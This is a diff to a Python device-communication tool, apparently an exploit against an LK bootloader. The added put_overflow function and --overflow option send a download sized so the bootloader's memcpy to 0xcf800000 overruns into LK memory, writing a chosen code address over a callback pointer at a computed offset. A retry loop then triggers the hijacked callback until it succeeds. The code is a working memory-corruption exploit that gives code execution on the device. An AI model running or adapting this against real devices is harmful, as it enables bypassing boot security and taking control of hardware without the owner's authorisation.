@@ -353,6 +353,27 @@ def put_packet(dev, stream, total, dst, timeout=600000, size_arg=None,
     return cmd(dev, 102, 7, (0, value, 0, dst[0], dst[1], last), timeout)
 
 
+def put_overflow(dev, dst, size, ctl_off, ctl, timeout=600000):
+    """Plain download whose copy to 0xcf800000 runs past into LK memory.
+
+    0xf48889d0: ldr w2,[x25,#0xfbc] ; mov w0,#0xcf800000 ; memcpy
+    The length is the transfer counter, so we choose it to land `ctl` on
+    0xf4c798b8 (0xcf800000 + 0x24798b8).
+    """
+    cmd(dev, 102, 2, (size,))
+    off = 0
+    while off < size:
+        n = min(BLOCK, size - off)
+        block = bytearray(n)
+        if off <= ctl_off < off + n:
+            at = ctl_off - off
+            block[at:at + len(ctl)] = ctl
+        tx(dev, bytes(block))
+        rx(dev, 8)
+        off += n
+    return cmd(dev, 102, 3, (0, size, 0, dst[0], dst[1], 0), timeout)
+
+
 def load_bundle(path):
     data = path.read_bytes()
     if not 64 <= len(data) <= PACK_MAX:
@@ -445,7 +466,7 @@ def walk(dev, dst, left, done, total, mark, step=None):
 def run(code_path, bundle_path, walk_len=None, span=None, block=None,
         packet=False, out_base=None, size_arg=None, probe_chunk=False,
         last=0, target_addr=None, sweep=False, records=False, step=256,
-        announce=None, oversize=None):
+        announce=None, oversize=None, overflow=False):
     code = code_path.read_bytes()
     bundle = load_bundle(bundle_path)
     if not code or len(code) > CODE_MAX or CODE_OFF + len(code) > 0x1000:
@@ -522,6 +543,30 @@ def run(code_path, bundle_path, walk_len=None, span=None, block=None,
 
         cmd(dev, 100, 5, (8,))
         cmd(dev, 102, 5)
+        if overflow:
+            target = CONTEXT_RESTORE or CODE_ADDR
+            ctl = struct.pack("<Q", target)
+            dst_base = 0xCF800000
+            ctl_off = WRITE_ADDR - dst_base
+            size = (ctl_off // BLOCK + 1) * BLOCK
+            print(f"overflow size {size:#x} ctl@{ctl_off:#x}", flush=True)
+            start = time.monotonic()
+            ret = put_overflow(dev, scratch, size, ctl_off, ctl)
+            print(f"put {time.monotonic() - start:.3f}s -> {ret:#x}",
+                  flush=True)
+            if ret == RESULT_OK:
+                return
+            for attempt in range(24):
+                time.sleep(5.0)
+                try:
+                    again = cmd(dev, 100, 0, timeout=20000)
+                except Exception as exc:
+                    print(f"trigger {attempt}: {exc}", flush=True)
+                    continue
+                print(f"trigger {attempt} -> {again:#x}", flush=True)
+                if again == RESULT_OK:
+                    return
+            raise RuntimeError(f"loader {ret:#x}")
         if packet:
             target = CONTEXT_RESTORE or CODE_ADDR
             base = OUT_BASE if out_base is None else out_base
@@ -628,6 +673,9 @@ def main():
                     help="transfer step for the compressed path")
     ap.add_argument("--oversize", type=lambda v: int(v, 0), default=None,
                     help="send a command packet of this size (receive probe)")
+    ap.add_argument("--overflow", action="store_true",
+                    help="plain download whose copy runs into LK memory "
+                         "(0xcf800000 + len -> send callback)")
     ap.add_argument("--announce", type=lambda v: int(v, 0), default=None,
                     help="value announced before the stream (default size)")
     args = ap.parse_args()
@@ -638,7 +686,7 @@ def main():
     run(args.code.resolve(), args.bundle.resolve(), args.walk, args.span,
         args.block, args.packet, args.out_base, args.size_arg,
         args.probe_chunk, args.last, args.target, args.sweep, args.records,
-        args.step, args.announce, args.oversize)
+        args.step, args.announce, args.oversize, args.overflow)
 
 
 if __name__ == "__main__":
